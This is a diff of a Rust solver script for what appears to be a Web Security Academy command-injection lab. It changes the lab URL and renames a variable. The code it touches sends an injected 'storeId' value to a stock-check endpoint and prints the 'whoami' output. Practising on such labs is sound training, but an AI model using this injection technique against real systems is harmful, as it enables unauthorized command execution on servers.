@@ -31,7 +31,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a08005404efe1318303338500b20072.web-security-academy.net";
+    let url = "https://0a02005b04a4d8688266adcf00ff00f4.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -52,7 +52,7 @@ fn main() {
     io::stdout().flush();
 
     // fetch the page with the injected payload
-    let inject = client
+    let injection = client
         .post(format!("{url}/product/stock"))
         .form(&HashMap::from([("productId", "2"), ("storeId", payload)]))
         .send()
@@ -62,7 +62,7 @@ fn main() {
         ));
 
     // the response contains the output of the `whoami` command
-    let whoami = inject.text().unwrap();
+    let whoami = injection.text().unwrap();
 
     print!("{} => {}", "OK".green(), whoami.yellow());
     println!(
